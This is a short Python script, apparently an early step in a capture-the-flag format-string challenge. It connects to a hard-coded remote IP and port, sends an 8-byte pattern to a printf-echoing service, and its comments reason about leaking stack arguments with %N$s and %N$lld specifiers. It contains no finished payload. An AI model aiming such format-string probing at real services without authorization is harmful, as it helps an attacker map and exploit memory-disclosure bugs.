#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.06)
    try: return s.recv(4096)
    except Exception: return b'<T>'
# place recognizable 8-byte pattern in buffer, then leak args to find which reads it
# pattern "ABCDEFGH" = 0x4847464544434241
pat=0x4847464544434241
# We send only 8 bytes pattern (no specifier) -> printf echoes it literally
d=ask(b"ABCDEFGH")
print("echo:", repr(d))
# Now, separate: leak args with the pattern? Instead, send pattern then %N$lld separately won't align.
# Better: find buffer index by checking which %N$s reads our input.
# Send format: "%3$s" ... %N$s, and check if it prints the LITERAL remaining buffer.
# Instead simpler: leak each arg and look for 0x4847464544434241 anywhere won't work (separate buffers).
# We'll send the pattern first, then on SAME connection leak args -- buffer still holds pattern? No, each send overwrites buffer.
print("done")
s.close()
